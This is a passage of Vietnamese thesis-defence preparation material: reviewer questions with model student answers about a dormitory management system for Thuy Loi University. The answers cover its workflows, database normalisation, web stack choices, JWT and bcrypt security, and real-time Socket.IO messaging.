# BỘ 50 CÂU HỎI BIỆN LUẬN VÀ ĐÁP ÁN BẢO VỆ ĐỒ ÁN TỐT NGHIỆP
# ĐỀ TÀI: HỆ THỐNG QUẢN LÝ KÝ TÚC XÁ TRƯỜNG ĐẠI HỌC THỦY LỢI (TLU)
# VAI TRÒ: HỘI ĐỒNG PHẢN BIỆN (REVIEWER) KHẮT KHE VÀ GIÀU KINH NGHIỆM

---

## PHẦN 1: BỐI CẢNH VÀ VẤN ĐỀ THỰC TIỄN (CONTEXT & PAIN POINTS)

### Câu hỏi 1: Hệ thống quản lý ký túc xá tại Trường Đại học Thủy Lợi đã vận hành từ lâu. Tại sao em lại lựa chọn đề tài này? Bối cảnh thực tế nào thúc đẩy việc phải xây dựng một hệ thống hoàn toàn mới thay vì tiếp tục sử dụng hoặc nâng cấp hệ thống cũ?
Trả lời của sinh viên:
Ký túc xá Đại học Thủy Lợi có quy mô lưu trú lớn với hàng nghìn sinh viên, tuy nhiên phương thức quản lý hiện tại vẫn còn thủ công và phân tán. Dữ liệu hồ sơ giấy tờ, bảng tính Excel, hóa đơn điện nước và thông tin kỷ luật nằm rải rác ở nhiều phòng ban. Việc tương tác giữa Ban quản lý và sinh viên chủ yếu qua các nhóm liên lạc tự phát như Zalo, gây trễ nải thông tin.
Hệ thống cũ không có cổng thông tin tự phục vụ dành riêng cho sinh viên, khiến sinh viên hoàn toàn bị động trong việc tra cứu hợp đồng, theo dõi hóa đơn và gửi phản ánh. Việc nâng cấp hệ thống cũ là không khả thi do kiến trúc cũ đã lạc hậu, không hỗ trợ giao tiếp thời gian thực và không có khả năng tích hợp các dịch vụ đám mây hay trí tuệ nhân tạo. Do đó, việc xây dựng một hệ thống mới đồng bộ, hiện đại theo mô hình Client-Server độc lập là vô cùng cấp thiết để số hóa toàn diện quy trình vận hành.

### Câu hỏi 2: Vấn đề nhức nhối nhất trong công tác quản lý ký túc xá hiện nay là gì? Đồ án của em giải quyết vấn đề đó ở khía cạnh kỹ thuật như thế nào?
Trả lời của sinh viên:
Vấn đề lớn nhất là sự bất đối xứng thông tin và tính thiếu minh bạch trong khâu xét duyệt hồ sơ xin ở ký túc xá và lập hóa đơn điện nước. Do nhu cầu phòng ở luôn vượt quá nguồn cung, việc xét duyệt thủ công dễ dẫn tới sự thiếu công bằng và sai sót.
Khía cạnh kỹ thuật giải quyết vấn đề này trong đồ án gồm hai phần:
Thứ nhất, số hóa và tự động hóa quy trình xét duyệt bằng thuật toán chấm điểm dựa trên ba nhóm trọng số linh hoạt (chính sách ưu tiên, năm học, và điểm học tập GPA). Hệ thống tích hợp dịch vụ Google Cloud Vision OCR để đối soát tự động ảnh chụp minh chứng chính sách do sinh viên tải lên, phát hiện các trường hợp thông tin khai báo không trùng khớp với ảnh minh chứng để cảnh báo cho Ban quản lý.
Thứ hai, tự động hóa quy trình lập hóa đơn và tích hợp thuật toán phát hiện bất thường. Hệ thống tự động so sánh chỉ số tiêu thụ điện nước tháng hiện tại với mức tiêu thụ trung bình ba tháng gần nhất của từng phòng. Nếu chỉ số tăng đột biến vượt quá năm mươi phần trăm, hệ thống sẽ tự động gắn cờ cảnh báo bất thường để Ban quản lý kiểm tra lại trước khi gửi hóa đơn tới sinh viên, đảm bảo tính chính xác và tránh tranh chấp tài chính.

### Câu hỏi 3: Nghiên cứu của em có tham khảo hay kế thừa từ các giải pháp quản lý ký túc xá thương mại hiện có trên thị trường không? Nếu có, điểm khác biệt lớn nhất là gì?
Trả lời của sinh viên:
Trong quá trình nghiên cứu, em đã tham khảo các phần mềm quản lý KTX thương mại. Tuy nhiên, các phần mềm này có ba điểm hạn chế lớn đối với đặc thù của Đại học Thủy Lợi:
Một là thiếu khả năng tùy biến cấu hình điểm ưu tiên và xếp phòng theo các tiêu chí riêng của trường (như khoa ngành, khóa học).
Hai là các phần mềm thương mại thường không tích hợp sẵn AI phục vụ phân tích hồ sơ chính sách và phân loại phản ánh, dẫn đến Ban quản lý vẫn phải rà soát thủ công rất nhiều hình ảnh minh chứng.
Ba là chi phí bản quyền lớn và khó tích hợp sâu vào hệ thống cổng thông tin sinh viên sẵn có của nhà trường. Sự khác biệt lớn nhất của đồ án là tích hợp trí tuệ nhân tạo (OCR, NLP) và tự động hóa xếp phòng liên thông hoàn chỉnh, tối ưu riêng cho quy trình nội trú của TLU.

### Câu hỏi 4: Làm thế nào em xác định được các bất cập của quy trình quản lý ký túc xá cũ? Em có thực hiện phỏng vấn Ban quản lý hay sinh viên thực tế không?
Trả lời của sinh viên:
Để xác định các điểm nghẽn (pain points), em đã tiến hành khảo sát thực tế thông qua hai hoạt động:
Với Ban quản lý: Em đã phỏng vấn trực tiếp cán bộ quản lý KTX tại tòa nhà để tìm hiểu quy trình tiếp nhận hồ sơ, lập hóa đơn điện nước và ghi chép kỷ luật. Em ghi nhận khâu đối soát ảnh minh chứng thẻ nghèo/cận nghèo và khâu đi từng phòng chốt số điện nước, sau đó nhập thủ công vào Excel là mất thời gian và dễ sai sót nhất.
Với sinh viên: Em thực hiện khảo sát qua Google Forms với hơn một trăm sinh viên nội trú để thu thập ý kiến về việc đóng tiền điện nước, nhận thông báo KTX và phản ánh hư hỏng thiết bị. Kết quả cho thấy hơn chín mươi phần trăm sinh viên mong muốn có một nền tảng web để chủ động theo dõi hóa đơn và thanh toán online thay vì phải chờ thông báo giấy hoặc đóng tiền mặt.

### Câu hỏi 5: Quy trình đăng ký ký túc xá online của sinh viên không cần tài khoản giải quyết bài toán gì và tiềm ẩn rủi ro gì về bảo mật?
Trả lời của sinh viên:
Bài toán giải quyết: Khi bắt đầu kỳ tuyển sinh mới, tân sinh viên hoặc sinh viên khóa cũ chưa có tài khoản nội trú KTX vẫn cần nộp đơn đăng ký o trực tuyến. Việc cho phép nộp đơn không cần đăng nhập giúp giảm rào cản tiếp cận hệ thống, tối ưu hóa quy trình tiếp nhận hồ sơ đầu vào của Ban quản lý.
Rủi ro bảo mật tiềm ẩn: Hệ thống có thể bị tấn công spam nộp đơn ảo bằng các đoạn script tự động (bot spam), gây tràn ngập cơ sở dữ liệu và quá tải máy chủ.
Cách khắc phục trong đồ án: Em đã tích hợp cơ chế Rate-limiting thông qua Redis ở Gateway để giới hạn số lượt nộp đơn từ một địa chỉ IP trong khoảng thời gian nhất định, đồng thời áp dụng OTP xác thực qua Email sinh viên. Sinh viên phải nhập đúng mã OTP gửi về email trường học thì đơn đăng ký mới được ghi nhận vào hệ thống.

### Câu hỏi 6: Em hãy trình bày rõ sự liên thông dữ liệu giữa các phân hệ quản lý hồ sơ, phòng ở và hợp đồng?
Trả lời của sinh viên:
Luồng dữ liệu liên thông được thiết kế tự động hoàn toàn:
Bước 1: Khi sinh viên nộp đơn đăng ký trực tuyến, dữ liệu nằm ở bảng register_forms dưới trạng thái Pending.
Bước 2: Khi Admin phê duyệt hồ sơ (chuyển trạng thái sang Approved), hệ thống tự động gọi Service tạo mới một tài khoản người dùng trong bảng users với role là STUDENT (sử dụng Email và số CCCD làm thông tin đăng nhập gốc).
Bước 3: Ngay sau đó, thuật toán xếp phòng tự động sẽ tìm kiếm phòng trống phù hợp với giới tính, khoa ngành của sinh viên để gán mã phòng (room_id).
Bước 4: Hệ thống tự động sinh một bản ghi hợp đồng mới trong bảng student_contracts với trạng thái Chờ kích hoạt, đồng thời gọi EmailService gửi thư điện tử chứa file PDF hợp đồng tạm thời kèm hướng dẫn nhận phòng đến cho sinh viên.

### Câu hỏi 7: Trong đồ án, em có nhắc đến khái niệm "Xét duyệt hồ sơ tự động theo lô lớn". Hãy giải thích rõ khái niệm này và cơ chế vận hành của nó?
Trả lời của sinh viên:
Xét duyệt hồ sơ tự động theo lô lớn (Bulk Approval) là tính năng cho phép Ban quản lý xử lý hàng trăm hoặc hàng nghìn đơn đăng ký của sinh viên cùng một lúc chỉ bằng một thao tác click chuột, thay vì phải mở và duyệt từng hồ sơ riêng lẻ.
Cơ chế vận hành:
Bước 1: Admin chọn đợt đăng ký và cấu hình các trọng số điểm ưu tiên (wPrior, wYear, wGPA).
Bước 2: Admin bấm nút Chạy mô phỏng xét duyệt. Backend sẽ tính toán điểm số Score cho toàn bộ hồ sơ Pending trong đợt đó, sau đó sắp xếp danh sách từ cao xuống thấp.
Bước 3: Dựa trên tổng chỉ tiêu giường trống thực tế của ký túc xá, hệ thống tự động đánh dấu Approved cho các hồ sơ nằm trong giới hạn chỉ tiêu (ví dụ lấy 500 sinh viên có điểm cao nhất) và đánh dấu Rejected cho các hồ sơ còn lại.
Bước 4: Admin kiểm tra lại danh sách mô phỏng, nếu đồng ý sẽ bấm Áp dụng chính thức. Hệ thống sẽ cập nhật trạng thái hàng loạt trong database và kích hoạt tiến trình tạo tài khoản, xếp phòng tự động hàng loạt.

---

## PHẦN 2: PHÂN TÍCH VÀ THIẾT KẾ HỆ THỐNG (SYSTEM ANALYSIS & DESIGN)

### Câu hỏi 8: Sơ đồ Use Case tổng quát của hệ thống có bao nhiêu Actor và nhóm chức năng chính? Tại sao lại phân chia như vậy?
Trả lời của sinh viên:
Sơ đồ Use Case tổng quát của hệ thống gồm có hai Actor chính là: Ban Quản Lý (Admin) và Sinh Viên (Student).
Phân chia chức năng:
Actor Ban Quản Lý quản lý chín nhóm chức năng: Duyệt hồ sơ, Quản lý hợp đồng, Quản lý buồng phòng, Lập hóa đơn dịch vụ, Quản lý tài sản, Xử lý vi phạm kỷ luật, Tiếp nhận phản ánh, Quản lý tin tức và Dashboard thống kê báo cáo.
Actor Sinh Viên thực hiện năm nhóm chức năng: Nộp đơn đăng ký trực tuyến, Quản lý thông tin cá nhân/hợp đồng, Xem và thanh toán hóa đơn online, Gửi ý kiến phản ánh hư hỏng và Hỏi đáp tương tác với Trợ lý ảo AI Chatbot.
Lý do phân chia: Việc phân chia này dựa trên nguyên tắc đặc quyền vai trò và luồng nghiệp vụ thực tế. Phân hệ Admin tập trung vào công tác quản trị và giám sát toàn diện, đòi hỏi tính bảo mật và toàn vẹn dữ liệu cao. Phân hệ Student tập trung vào tính tự phục vụ, đơn giản hóa quy trình và tối ưu hóa trải nghiệm người dùng.

### Câu hỏi 9: Hãy giải thích luồng dữ liệu của biểu đồ tuần tự (Sequence Diagram) khi sinh viên thực hiện đăng ký ký túc xá online?
Trả lời của sinh viên:
Luồng dữ liệu của biểu đồ tuần tự diễn ra qua các bước:
1. Sinh viên (User) điền thông tin đăng ký và tải ảnh minh chứng lên giao diện (LoginPage/RegistrationForm).
2. Frontend gửi request chứa dữ liệu và file ảnh đến API Gateway `/api/registrations/register`.
3. Route chuyển hướng yêu cầu đến RegistrationController.
4. RegistrationController gọi RegistrationService để xử lý nghiệp vụ.
5. RegistrationService gọi Google Cloud Vision Service để phân tích chữ viết ảnh minh chứng chính sách lấy kết quả đối soát.
6. Service tính toán điểm ưu tiên sơ bộ và gọi RegisterFormDAO để chèn bản ghi mới vào bảng register_forms trong PostgreSQL.
7. Cơ sở dữ liệu trả về kết quả lưu thành công cho DAO, DAO chuyển tiếp lên Service.
8. Service gọi EmailService gửi email OTP xác thực cho sinh viên.
9. Đăng ký thành công tạm thời, Controller trả về response HTTP 201 Success cho Frontend hiển thị thông báo yêu cầu xác nhận OTP.

### Câu hỏi 10: Tại sao trong biểu đồ hoạt động (Activity Diagram) của khâu lập hóa đơn lại có nhánh xử lý cảnh báo bất thường? Nhánh này do tác nhân nào kích hoạt?
Trả lời của sinh viên:
Nhánh xử lý cảnh báo bất thường (Anomaly Detection Branch) được thiết kế để kiểm soát chất lượng dữ liệu tài chính trước khi hóa đơn được xuất bản. Nhánh này được kích hoạt tự động bởi hệ thống Backend (thông qua InvoiceService) tại thời điểm lập hóa đơn điện nước cho phòng, không phụ thuộc vào thao tác của con người.
Hoạt động của nhánh:
Khi chỉ số điện nước mới được nhập, hệ thống sẽ tự động so sánh lượng tiêu thụ của tháng này với mức trung bình ba tháng trước đó.
Nếu lượng tiêu thụ tăng vượt quá năm mươi phần trăm, luồng hoạt động sẽ rẽ sang nhánh Gắn cờ cảnh báo bất thường (is_anomaly = true) và gửi thông báo trực quan trên giao diện của Kế toán.
Nếu lượng tiêu thụ bình thường, luồng hoạt động sẽ đi tiếp tới bước Tạo hóa đơn chuẩn và gửi email thông báo trực tiếp cho sinh viên.
Cơ chế này giúp loại bỏ hoàn toàn việc gửi nhầm hóa đơn sai lệch chỉ số do lỗi nhập liệu của con người.

### Câu hỏi 11: Thiết kế cơ sở dữ liệu của em đã được chuẩn hóa ở dạng chuẩn mấy (1NF, 2NF, 3NF)? Hãy chỉ ra một bảng cụ thể và giải thích tính chuẩn hóa của nó?
Trả lời của sinh viên:
Thiết kế cơ sở dữ liệu của hệ thống đã được chuẩn hóa đạt dạng chuẩn 3 (3NF).
Ví dụ bảng student_contracts:
- Đạt 1NF: Tất cả các thuộc tính của bảng đều là các giá trị nguyên tố (atomic values), không có thuộc tính đa trị hay thuộc tính phức hợp trong các trường (ví dụ các trường id, user_id, room_id, status đều chứa dữ liệu đơn nhất).
- Đạt 2NF: Bảng có khóa chính đơn là id. Tất cả các thuộc tính không phải khóa (như rent_price, deposit_amount, status, signed_at) đều phụ thuộc hàm hoàn toàn vào khóa chính này.
- Đạt 3NF: Không có sự phụ thuộc bắc cầu giữa các thuộc tính không phải khóa. Ví dụ thuộc tính room_id tham chiếu sang bảng rooms, nhưng các chi tiết của phòng như tên phòng, sức chứa không được lưu trong bảng student_contracts mà lưu ở bảng rooms nhằm loại bỏ hoàn toàn sự dư thừa dữ liệu và tránh dị thường khi cập nhật.

### Câu hỏi 12: Tại sao bảng settings trong database lại dùng kiểu dữ liệu JSONB của PostgreSQL thay vì tạo ra nhiều cột thông thường?
Trả lời của sinh viên:
Bảng settings lưu trữ các tham số cấu hình của hệ thống như biểu phí điện nước, các trọng số điểm ưu tiên, điều kiện điểm sàn GPA. Việc sử dụng kiểu dữ liệu JSONB mang lại ba lợi ích kỹ thuật lớn:
Một là tính linh hoạt cao: Các chính sách quản lý KTX có thể thay đổi theo từng năm (ví dụ năm nay thêm đối tượng ưu tiên mới hoặc thay đổi cách tính tiền phạt). Nếu dùng cột thông thường, em sẽ phải thay đổi cấu trúc bảng (schema migration) liên tục. Dùng JSONB cho phép em lưu trữ cấu trúc dữ liệu tùy ý dạng key-value mà không cần thay đổi schema của PostgreSQL.
Hai là hiệu năng vượt trội: Kiểu JSONB lưu trữ dữ liệu dưới dạng nhị phân đã được phân tích cú pháp (parsed binary), giúp PostgreSQL truy vấn trực tiếp vào các key bên trong JSON nhanh hơn rất nhiều so với kiểu JSON văn bản thuần túy và hỗ trợ tạo chỉ mục GIN (Generalized Inverted Index).
Ba là giảm số lượng bảng và truy vấn: Em có thể lưu toàn bộ cấu hình hệ thống trong một dòng duy nhất với định dạng JSONB, giúp việc đọc cấu hình khi khởi động server diễn ra nhanh chóng chỉ qua một câu lệnh SELECT đơn giản.

### Câu hỏi 13: Việc thiết kế cơ sở dữ liệu có tính toán đến khả năng mở rộng (scalability) khi số lượng sinh viên tăng lên hàng chục nghìn không?
Trả lời của sinh viên:
Thiết kế cơ sở dữ liệu của đồ án đã được tối ưu hóa để sẵn sàng mở rộng quy mô lớn:
Tạo chỉ mục (Indexing): Em đã tạo chỉ mục B-Tree trên các trường thường xuyên dùng để tìm kiếm và kết hợp bảng như email, student_id trong bảng users và register_forms, trường room_id trong bảng student_contracts.
Phân chia dữ liệu (Partitioning) và tối ưu hóa truy vấn: Bảng lịch sử logs (log_system) lưu trữ nhật ký hoạt động có thể tăng kích thước rất nhanh. Em đã thiết kế bảng này độc lập, sử dụng các câu lệnh truy vấn phân trang phía DB (LIMIT và OFFSET) để tránh tình trạng tràn bộ nhớ RAM máy chủ khi kết xuất dữ liệu.
Sử dụng khóa ngoại thông minh: Chỉ thiết lập các ràng buộc khóa ngoại thực sự cần thiết cho tính toàn vẹn dữ liệu tài chính (invoices, contracts) và sử dụng cơ chế soft delete (trường deleted_at) thay vì xóa vật lý để giữ vững hiệu năng của cơ sở dữ liệu quan hệ.

### Câu hỏi 14: Cơ chế khóa ngoại (Foreign Key Constraints) và Cascade Delete được cấu hình như thế nào để đảm bảo tính toàn vẹn dữ liệu khi xóa một phòng hoặc một hợp đồng?
Trả lời của sinh viên:
Để đảm bảo tính toàn vẹn dữ liệu (Referential Integrity), em thiết lập cấu hình khóa ngoại chặt chẽ giữa các bảng:
Từ student_contracts sang users và rooms: Thiết lập khóa ngoại ràng buộc `user_id` tham chiếu đến `users(id)` và `room_id` tham chiếu đến `rooms(id)`.
Cấu hình hành vi xóa (On Delete Action): Em tuyệt đối không sử dụng `ON DELETE CASCADE` cho các thực thể quan trọng như hợp đồng (contracts) hay hóa đơn (invoices). Nếu xóa một phòng hoặc một sinh viên mà hợp đồng của họ tự động bị xóa theo (Cascade Delete) sẽ gây mất dấu vết tài chính nguy hiểm.
Thay vào đó, em áp dụng cấu hình `ON DELETE RESTRICT` hoặc `ON DELETE SET NULL`. Ví dụ, nếu muốn xóa một phòng o, Admin phải thực hiện chuyển toàn bộ sinh viên đang ở phòng đó sang phòng khác và kết thúc/hủy các hợp đồng liên quan trước; nếu không hệ thống sẽ chặn hành động xóa và báo lỗi khóa ngoại. Điều này đảm bảo an toàn tuyệt đối cho lịch sử dữ liệu hệ thống.

---

## PHẦN 3: CÔNG NGHỆ VÀ KIẾN TRÚC HỆ THỐNG (ARCHITECTURE & TECHNOLOGY STACK)

### Câu hỏi 15 (CÂU HỎI BẮT BUỘC): Tại sao em lại lựa chọn Node.js, Express, React và PostgreSQL mà không phải các công nghệ khác như Java Spring Boot, ASP.NET, Angular hay MySQL?
Trả lời của sinh viên:
Việc lựa chọn stack công nghệ này dựa trên các phân tích kỹ thuật và ràng buộc thực tế của dự án:
Đối với Node.js và Express:
Node.js sử dụng cơ chế Non-blocking I/O và mô hình Single-threaded Event Loop, giúp tối ưu hóa tài nguyên phần cứng máy chủ và xử lý đồng thời cực tốt các yêu cầu I/O không đồng bộ. Express là một framework tối giản, linh hoạt, giúp xây dựng các endpoint REST API nhanh chóng. Sự đồng bộ JavaScript từ Frontend đến Backend giúp việc kết nối và duy trì các kết nối Socket.IO thời gian thực diễn ra mượt mà và nhất quán nhất, điều mà các framework chạy đa luồng như Java Spring Boot hay ASP.NET đòi hỏi cấu hình phức tạp hơn để đạt hiệu năng tương đương khi xử lý realtime.

Đối với React:
React sử dụng cơ chế Virtual DOM giúp tối ưu hóa quá trình cập nhật giao diện người dùng (re-rendering). Đối với một hệ thống quản lý có lượng biểu đồ phân tích thay đổi liên tục và nhiều bảng dữ liệu thời gian thực, React mang lại trải nghiệm SPA (Single Page Application) mượt mà hơn hẳn so với Angular (vốn quá cồng kềnh, cấu hình phức tạp cho một dự án độc lập) hay Vue.js.

Đối với PostgreSQL:
PostgreSQL là hệ quản trị cơ sở dữ liệu quan hệ mã nguồn mở mạnh mẽ nhất hiện nay. Điểm vượt trội của PostgreSQL so với MySQL là khả năng hỗ trợ kiểu dữ liệu JSONB cực kỳ mạnh mẽ kèm chỉ mục GIN. Hệ thống của em có nhiều bảng cấu hình động (như bảng settings điểm ưu tiên, cài đặt biểu phí dịch vụ có thể thay đổi theo từng năm). Sử dụng JSONB giúp em lưu trữ các cấu hình động này linh hoạt mà không cần thay đổi cấu trúc bảng (schema migration) liên tục. Đồng thời, PostgreSQL tuân thủ tuyệt đối các tiêu chuẩn ACID (Atomicity, Consistency, Isolation, Durability) giúp đảm bảo an toàn tối đa cho các giao dịch tài chính thanh toán hóa đơn của sinh viên.

### Câu hỏi 16: Nếu kết nối mạng giữa Frontend và Backend bị gián đoạn, hệ thống xử lý thế nào để người dùng không bị mất dữ liệu đang nhập trên giao diện?
Trả lời của sinh viên:
Để nâng cao trải nghiệm người dùng và phòng ngừa sự cố mất kết nối mạng (Network Disconnection), em đã triển khai các cơ chế kiểm soát lỗi sau:
Ở tầng Frontend:
Đối với các biểu mẫu nhập liệu dài (như form đăng ký KTX của sinh viên), em sử dụng thuộc tính lưu trữ tạm thời `sessionStorage` của trình duyệt. Mỗi khi người dùng gõ phím, dữ liệu được tự động đồng bộ xuống bộ nhớ tạm này. Nếu trình duyệt bị reload hoặc mất mạng giữa chừng, dữ liệu cũ sẽ tự động được khôi phục lại khi kết nối hoạt động bình thường.
Đồng thời, em viết một lớp Axios interceptor để bắt lỗi kết nối HTTP (ERR_NETWORK). Khi phát hiện mất kết nối tới Backend, Frontend sẽ chặn hành vi submit đơn, hiển thị một Toast cảnh báo đỏ yêu cầu người dùng không tắt trình duyệt và tự động thử gửi lại (retry mechanism) tối đa ba lần trước khi thông báo lỗi chính thức.

### Câu hỏi 17: Giải thích cơ chế xác thực Stateless Authentication bằng JWT. Tại sao nó lại phù hợp với hệ thống này hơn là cơ chế Stateful Session truyền thống?
Trả lời của sinh viên:
Cơ chế Stateless Authentication bằng JWT (JSON Web Token) hoạt động như sau:
1. Người dùng gửi thông tin đăng nhập đến Backend.
2. Backend kiểm tra tài khoản, nếu đúng sẽ ký một mã Token chứa các thông tin công khai (userId, email, role) bằng một mã khóa bí mật (JWT_SECRET) và gửi trả Token về cho Client.
3. Client lưu Token này lại (trong LocalStorage hoặc SessionStorage) và đính kèm vào Header Authorization dạng Bearer Token trong mọi request tiếp theo gửi lên Backend.
4. Backend nhận request, giải mã chữ ký Token bằng JWT_SECRET để xác thực danh tính mà không cần phải thực hiện bất kỳ truy vấn nào vào database hay bộ nhớ RAM để tìm Session.

Lý do JWT phù hợp hơn Stateful Session:
Một là khả năng mở rộng (scalability): Vì server không cần lưu trữ trạng thái phiên làm việc (stateless), hệ thống có thể dễ dàng nhân bản ra nhiều máy chủ Backend chạy song song (load balancing) mà không cần lo lắng về việc đồng bộ bộ nhớ session giữa các server.
Hai là hiệu năng cao: Bỏ qua bước đọc ghi session lưu trong DB/RAM giúp giảm đáng kể thời gian phản hồi của API.
Ba là tích hợp di động: JWT là chuẩn chung, giúp hệ thống dễ dàng kết nối với ứng dụng Mobile App (hướng phát triển tương lai) mà không gặp rào cản về cơ chế cookie/session của trình duyệt web.

### Câu hỏi 18: Token JWT được lưu trữ ở đâu trên trình duyệt của người dùng (LocalStorage hay Cookies)? Điểm mạnh và điểm yếu bảo mật của lựa chọn này là gì?
Trả lời của sinh viên:
Trong đồ án hiện tại, Token JWT được lưu trữ tại LocalStorage của trình duyệt Frontend để phục vụ kết nối và lưu thông tin đăng nhập nhanh chóng.
Phân tích điểm mạnh và điểm yếu bảo mật của lựa chọn này:
Điểm mạnh: Triển khai vô cùng đơn giản, dễ dàng truy cập bằng JavaScript để đính kèm vào Header của các yêu cầu HTTP Axios hoặc kết nối Socket.IO, giúp Frontend chủ động kiểm soát trạng thái đăng nhập của người dùng.
Điểm yếu bảo mật: LocalStorage dễ bị tấn công XSS (Cross-Site Scripting). Nếu hacker chèn được một đoạn mã độc JavaScript vào trang web, họ có thể đọc trực tiếp Token JWT từ LocalStorage và đánh cắp tài khoản của người dùng.
Giải pháp khắc phục và hướng nâng cấp: Để khắc phục rủi ro XSS, trong môi trường Production thực tế, Token JWT nên được lưu trữ trong HttpOnly Cookie. Khi cấu hình thuộc tính HttpOnly và Secure cho Cookie, mã JavaScript trên trình duyệt hoàn toàn không thể đọc được Token, giúp bảo vệ tài khoản của người dùng an toàn tối đa trước tấn công XSS.

### Câu hỏi 19: Bcrypt Hashing hoạt động như thế nào? Tại sao nó lại có khả năng chống tấn công brute-force tốt hơn các thuật toán băm thông thường như MD5 hay SHA256?
Trả lời của sinh viên:
Bcrypt là một thuật toán băm mật khẩu một chiều được thiết kế dựa trên thuật toán mã hóa Blowfish. Điểm đặc biệt của Bcrypt nằm ở ba yếu tố:
Yếu tố thứ nhất là tự động thêm muối (Salt): Bcrypt tự động sinh một chuỗi ngẫu nhiên gọi là muối và kết hợp nó với mật khẩu trước khi băm. Điều này đảm bảo hai người dùng có mật khẩu giống nhau thì chuỗi băm lưu trong DB vẫn hoàn toàn khác nhau, vô hiệu hóa hoàn toàn kiểu tấn công sử dụng bảng băm chuẩn bị sẵn (Rainbow Table).
Yếu tố thứ hai là hệ số công việc (Work Factor / Cost): Bcrypt cho phép cấu hình số vòng bặp băm (Salt Rounds, mặc định em chọn là 10). Số vòng lặp càng lớn, thời gian tính toán băm càng lâu.
Yếu tố thứ ba là khả năng chống tấn công phần cứng: MD5 và SHA256 được thiết kế để tính toán cực nhanh (dùng cho kiểm tra tính toàn vẹn file). Kẻ tấn công có thể dùng card đồ họa GPU hoặc chip ASIC để thử hàng tỷ mật khẩu mỗi giây (brute-force). Bcrypt cố tình kéo dài thời gian xử lý của CPU (mất khoảng vài chục mili-giây cho một lần băm). Thời gian trễ này là không đáng kể đối với một người dùng đăng nhập bình thường, nhưng là thảm họa đối với kẻ tấn công vì nó làm giảm tốc độ thử mật khẩu đi hàng triệu lần.

### Câu hỏi 20: Tại sao em lại chọn Express phiên bản 5 thay vì phiên bản 4 phổ biến? Nó mang lại cải tiến kỹ thuật nào cho dự án?
Trả lời của sinh viên:
Em lựa chọn Express 5 (hiện đang là phiên bản ổn định mới nhất) vì nó mang lại một cải tiến kỹ thuật cực kỳ quan trọng cho dự án: Tự động bắt lỗi trong các hàm bất đồng bộ (Asynchronous Error Handling).
Trong Express 4: Khi sử dụng `async/await` cho các controller gọi DAO truy vấn database, nếu xảy ra lỗi (như lỗi kết nối DB, lỗi khóa ngoại), em bắt buộc phải viết khối lệnh `try/catch` ở mọi controller và gọi hàm `next(error)` theo cách thủ công. Nếu quên viết `try/catch`, lỗi bất đồng bộ đó sẽ trở thành unhandled promise rejection và có thể làm crash toàn bộ server NodeJS.
Trong Express 5: Bộ định tuyến (Router) đã hỗ trợ hoàn chỉnh các hàm bất đồng bộ. Nếu một route handler ném ra một Promise bị reject (lỗi xảy ra trong async function), Express 5 sẽ tự động bắt lấy lỗi đó và chuyển tiếp đến Middleware xử lý lỗi tập trung (errorHandler) của hệ thống mà không cần lập trình viên phải viết `try/catch` thủ công ở mọi nơi. Điều này giúp mã nguồn Backend sạch sẽ, ngắn gọn và an toàn hơn rất nhiều.

### Câu hỏi 21: Thư viện React 19 mà em sử dụng có những tính năng mới nào nổi bật so với các phiên bản React cũ?
Trả lời của sinh viên:
React 19 mang lại những cải tiến đột phá giúp đơn giản hóa việc quản lý dữ liệu bất đồng bộ và tối ưu hóa hiệu năng giao diện:
1. Hỗ trợ React Compiler: Tự động tối ưu hóa việc ghi nhớ các giá trị render (memoization) mà không cần lập trình viên phải viết các hook phức tạp như `useMemo` hay `useCallback` một cách thủ công như trước.
2. Khái niệm Actions mới: Giúp tự động quản lý trạng thái loading, lỗi và phản hồi bất đồng bộ trực tiếp khi submit form thông qua thẻ form nguyên bản hoặc hook `useActionState`.
3. Hook `use`: Cho phép đọc trực tiếp các Promise hoặc Context ngay trong quá trình render, giúp code Frontend xử lý các tác vụ gọi API mượt mà và trực quan hơn.

### Câu hỏi 22: Tailwind CSS 4 mang lại lợi ích gì cho việc tối ưu hóa hiệu năng render giao diện của Frontend?
Trả lời của sinh viên:
Tailwind CSS 4 được nâng cấp toàn diện với công cụ biên dịch mới viết bằng ngôn ngữ Rust (Rust-based engine), mang lại các lợi ích hiệu năng to lớn:
Tốc độ biên dịch cực nhanh: Nhanh hơn gấp mười lần so với phiên bản 3 sử dụng JavaScript. Điều này giúp cải thiện đáng kể trải nghiệm lập trình viên khi lưu file và cập nhật giao diện thời gian thực (Hot Module Replacement - HMR) trên Vite.
Kích thước file CSS xuất bản (bundle size) nhỏ hơn: Tailwind 4 phân tích mã nguồn thông minh hơn, loại bỏ hoàn toàn các class CSS không sử dụng và gộp mã CSS tối ưu, giúp giảm dung lượng tải trang ban đầu cho trình duyệt sinh viên, tăng tốc độ hiển thị trang đầu tiên (First Contentful Paint).
Cấu hình CSS-native: Chuyển đổi toàn bộ cấu hình từ file JavaScript sang các biến CSS nguyên bản (@theme), giúp trình duyệt xử lý các biến giao diện nhanh hơn ở cấp độ phần cứng.

### Câu hỏi 23: Giao tiếp thời gian thực qua Socket.IO được triển khai như thế nào? Cơ chế kết nối lại (Reconnection) hoạt động ra sao khi mất mạng?
Trả lời của sinh viên:
Triển khai Socket.IO trong hệ thống:
Backend khởi tạo một máy chủ Socket.IO tích hợp chung cổng với Express HTTP Server.
Khi Client (đã đăng nhập) kết nối thành công, Client sẽ gửi sự kiện authenticate chứa Token JWT để xác thực. Backend giải mã Token và đưa Socket connection của người dùng vào một Room cụ thể (ví dụ room `user-userId` cho sinh viên hoặc room `admin` cho Ban quản lý).
Khi có sự kiện mới (như phê duyệt hồ sơ, có hóa đơn mới, có phản ánh mới), Backend sẽ phát tín hiệu (emit) trực tiếp tới Room tương ứng để đẩy thông báo thời gian thực.
Cơ chế kết nối lại (Reconnection):
Thư viện socket.io-client tích hợp sẵn thuật toán tự động kết nối lại. Khi kết nối bị đứt (mất mạng), Client sẽ tự động thử kết nối lại sau một khoảng thời gian trễ tăng dần (Exponential Backoff) để tránh làm nghẽn máy chủ. Khi kết nối lại thành công, client tự động gửi lại sự kiện authenticate để lấy lại trạng thái hoạt động trực tuyến thời gian thực mà không cần người dùng phải reload trang.

### Câu hỏi 24: Socket.IO sử dụng giao thức nào bên dưới? Làm thế nào nó chuyển đổi (upgrade) từ HTTP sang WebSocket?
Trả lời của sinh viên:
Socket.IO sử dụng thư viện Engine.IO bên dưới, kết hợp hai giao thức truyền tải chính: HTTP Long-Polling và WebSocket.
Quy trình chuyển đổi (Upgrade) diễn ra như sau:
1. Thiết lập kết nối ban đầu bằng HTTP Long-Polling: Client gửi yêu cầu HTTP GET đầu tiên lên server. Cách này đảm bảo kết nối luôn thành công ngay cả khi có tường lửa hoặc proxy chặn giao thức WebSocket.
